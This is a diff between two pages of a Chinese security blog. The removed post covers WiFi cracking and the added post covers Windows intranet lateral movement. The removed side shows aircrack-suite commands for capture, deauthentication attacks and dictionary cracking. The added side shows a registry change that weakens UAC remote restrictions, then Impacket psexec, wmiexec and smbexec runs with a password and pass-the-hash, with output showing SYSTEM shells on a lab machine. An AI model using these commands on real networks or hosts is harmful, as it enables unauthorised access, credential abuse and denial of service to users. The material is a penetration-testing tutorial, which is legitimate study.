@@ -18,30 +18,23 @@
   <meta name="author" content="k3rwin">
   <meta name="keywords" content="">
   
-    <meta name="description" content="近源渗透一.wifi破解 列出可用无线网卡 airmon-ng   开启网卡监控 airmon-ng check kill airmon-ng start wlan0   扫描wifi  wlan0开启网卡监控后查看重新名称是否修改，ifconfig 可能会变成wlan0mon 关键点：  ·BSSID：网卡MAC地址，  ·CH：信道通道(频道)，  ·ESSID：Wifi名称，  ·STATI">
+    <meta name="description" content="内网横向移动一.各种端口135端口 psexec   需要开启注册表&#96;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f&#96;&#96;&#96;&amp;#">
 <meta property="og:type" content="article">
-<meta property="og:title" content="近源渗透">
-<meta property="og:url" content="https://k3rwin.github.io/2023/09/02/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:title" content="内网横向移动合集">
+<meta property="og:url" content="https://k3rwin.github.io/2023/09/06/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%90%88%E9%9B%86/index.html">
 <meta property="og:site_name" content="K3rwin&#39;s Blog">
-<meta property="og:description" content="近源渗透一.wifi破解 列出可用无线网卡 airmon-ng   开启网卡监控 airmon-ng check kill airmon-ng start wlan0   扫描wifi  wlan0开启网卡监控后查看重新名称是否修改，ifconfig 可能会变成wlan0mon 关键点：  ·BSSID：网卡MAC地址，  ·CH：信道通道(频道)，  ·ESSID：Wifi名称，  ·STATI">
+<meta property="og:description" content="内网横向移动一.各种端口135端口 psexec   需要开启注册表&#96;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f&#96;&#96;&#96;&amp;#">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021413933.png">
-<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021301071.png">
-<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021331489.png">
-<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021352164.png">
-<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021404818.png">
-<meta property="og:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021407583.png">
-<meta property="article:published_time" content="2023-09-02T04:54:38.000Z">
-<meta property="article:modified_time" content="2023-09-02T06:13:52.852Z">
+<meta property="article:published_time" content="2023-09-06T15:07:12.000Z">
+<meta property="article:modified_time" content="2023-09-12T02:25:53.731Z">
 <meta property="article:author" content="k3rwin">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021413933.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>近源渗透 - K3rwin&#39;s Blog</title>
+  <title>内网横向移动合集 - K3rwin&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -240,7 +233,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="近源渗透"></span>
+            <span id="subtitle" data-typed-text="内网横向移动合集"></span>
           
         </div>
 
@@ -256,8 +249,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-09-02 12:54" pubdate>
-          2023年9月2日 下午
+        <time datetime="2023-09-06 23:07" pubdate>
+          2023年9月6日 晚上
         </time>
       </span>
     
@@ -268,7 +261,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          571 字
+          1.3k 字
         
       </span>
     
@@ -279,7 +272,7 @@
         
         
         
-          5 分钟
+          11 分钟
         
       </span>
     
@@ -325,59 +318,31 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">近源渗透</h1>
+            <h1 style="display: none">内网横向移动合集</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="近源渗透"><a href="#近源渗透" class="headerlink" title="近源渗透"></a>近源渗透</h1><h2 id="一-wifi破解"><a href="#一-wifi破解" class="headerlink" title="一.wifi破解"></a>一.wifi破解</h2><ol>
-<li><p>列出可用无线网卡</p>
-<p><code>airmon-ng</code></p>
-<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021413933.png" srcset="/img/loading.gif" lazyload alt="image-20230902125854051"></p>
-</li>
-<li><p>开启网卡监控</p>
-<p><code>airmon-ng check kill</code></p>
-<p><code>airmon-ng start wlan0</code></p>
-<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021301071.png" srcset="/img/loading.gif" lazyload alt="image-20230902130113036"></p>
-</li>
-<li><p>扫描wifi</p>
-<blockquote>
-<p>wlan0开启网卡监控后查看重新名称是否修改，ifconfig</p>
-<p>可能会变成wlan0mon</p>
-<p><strong>关键点：</strong></p>
-<ul>
-<li><p><strong>·BSSID：网卡MAC地址，</strong></p>
-</li>
-<li><p><strong>·CH：信道通道(频道)，</strong></p>
-</li>
-<li><p><strong>·ESSID：Wifi名称，</strong></p>
-</li>
-<li><p><strong>·STATION：可理解为连接着这个网络的某一台手机的MAC地址</strong></p>
-</li>
+                <h1 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h1><h2 id="一-各种端口"><a href="#一-各种端口" class="headerlink" title="一.各种端口"></a>一.各种端口</h2><h3 id="135端口"><a href="#135端口" class="headerlink" title="135端口"></a>135端口</h3><ul>
+<li>psexec</li>
 </ul>
-<p> <strong>.PWR：信号强弱程度，数值越小信号越强；</strong></p>
-<p> <strong>.DATA：数据量，越大使用的人就越多</strong></p>
+<blockquote>
+<p>需要开启注册表&#96;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f&#96;&#96;&#96;&#96;</p>
 </blockquote>
-<p><code>airmon-ng start wlan0</code> </p>
-<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021331489.png" srcset="/img/loading.gif" lazyload alt="image-20230902133126443"></p>
-</li>
-<li><p>抓包</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">airodump-ng -w wifi -c 11 --bssid 64:64:4A:B3:B4:56 wlan0 <br><br>   	 -c：指定信道<br>     -w：保存数据包名<br>     --bssid：指定路由器的MAC<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#用户名密码传递 </span><br><span class="hljs-comment">#psexec.py k3rwin:k3rwin@10.211.55.10 whoami</span><br><br><span class="hljs-comment">#ntml hash传递</span><br>╭─ ~                                                                                                      ✔  3s ─╮<br>╰─ psexec.py -hashes :20cc171a17c512fa303b0b7502fe1c34 k3rwin@192.168.0.110 -codec GBK                               ─╯<br>Impacket v0.11.0 - Copyright 2023 Fortra<br><br>[*] Requesting shares on 192.168.0.110.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file WghUwOTP.exe<br>[*] Opening SVCManager on 192.168.0.110.....<br>[*] Creating service yrWr on 192.168.0.110.....<br>[*] Starting service yrWr.....<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>Microsoft Windows [版本 10.0.19045.3324]<br>(c) Microsoft Corporation。保留所有权利。<br><br>C:\WINDOWS\system32&gt; <span class="hljs-built_in">whoami</span><br>nt authority\system<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021352164.png" srcset="/img/loading.gif" lazyload alt="image-20230902135235126"></p>
-</li>
-<li><p>wifi攻击，打断重连获取握手包(可选)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">aireplay-ng -0 0 -c BC:D0:74:1E:2B:1D -a 64:64:4A:B3:B4:56 wlan0<br><br>-0：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）<br>-a：指定路由器的MAC<br>-c：指定客户机的MAC<br></code></pre></td></tr></table></figure>
+<ul>
+<li>wmiexec</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">╭─ ~                                                                                                         2 ✘ ─╮<br>╰─ wmiexec.py -hashes :20cc171a17c512fa303b0b7502fe1c34 k3rwin@192.168.0.110 -codec GBK                              ─╯<br>Impacket v0.11.0 - Copyright 2023 Fortra<br><br>[*] SMBv3.0 dialect used<br>[!] Launching semi-interactive shell - Careful what you execute<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>C:\&gt;<span class="hljs-built_in">whoami</span><br>desktop-duv9jg1\k3rwin<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021404818.png" srcset="/img/loading.gif" lazyload alt="image-20230902140416760"></p>
-</li>
-<li><p>暴力破解(撞库)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aircrack-ng  -w  /home/parallels/Desktop/pass wifi-09.cap<br>-w 破解字典<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021407583.png" srcset="/img/loading.gif" lazyload alt="image-20230902140752535"></p>
-</li>
-</ol>
 
+<h3 id="445端口"><a href="#445端口" class="headerlink" title="445端口"></a>445端口</h3><ul>
+<li><p>smbexec</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">╭─ ~                                                                                                         1 ✘ ─╮<br>╰─ smbexec.py k3rwin:k3rwin@192.168.0.110                                                                            ─╯<br>Impacket v0.11.0 - Copyright 2023 Fortra<br><br>[!] Launching semi-interactive shell - Careful what you execute<br>C:\WINDOWS\system32&gt;<span class="hljs-built_in">whoami</span><br>nt authority\system<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="3389端口"><a href="#3389端口" class="headerlink" title="3389端口"></a>3389端口</h3>
                 
               </div>
             
@@ -415,8 +380,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>近源渗透</div>
-      <div>https://k3rwin.github.io/2023/09/02/近源渗透/</div>
+      <div>内网横向移动合集</div>
+      <div>https://k3rwin.github.io/2023/09/06/内网横向移动合集/</div>
     </div>
     <div class="license-meta">
       
@@ -428,13 +393,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年9月2日</div>
+          <div>2023年9月6日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2023年9月2日</div>
+          <div>2023年9月12日</div>
         </div>
       
       <div class="license-meta-item">
@@ -463,9 +428,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/09/06/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%90%88%E9%9B%86/" title="内网横向移动合集">
+                      <a href="/2023/09/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="流量分析">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">内网横向移动合集</span>
+                        <span class="hidden-mobile">流量分析</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -473,8 +438,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/12/12/python%E5%AE%9E%E7%8E%B0sql%E4%B8%AD%E8%BD%AC%E6%B3%A8%E5%85%A5/" title="python实现sql中转注入">
-                        <span class="hidden-mobile">python实现sql中转注入</span>
+                      <a href="/2023/09/02/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/" title="近源渗透">
+                        <span class="hidden-mobile">近源渗透</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -492,8 +457,8 @@
     
       <script type="text/javascript">
         var disqus_config = function() {
-          this.page.url = 'https://k3rwin.github.io/2023/09/02/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/';
-          this.page.identifier = '/2023/09/02/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/';
+          this.page.url = 'https://k3rwin.github.io/2023/09/06/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%90%88%E9%9B%86/';
+          this.page.identifier = '/2023/09/06/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%90%88%E9%9B%86/';
         };
         Fluid.utils.loadComments('#disqus_thread', function() {
           var d = document, s = d.createElement('script');
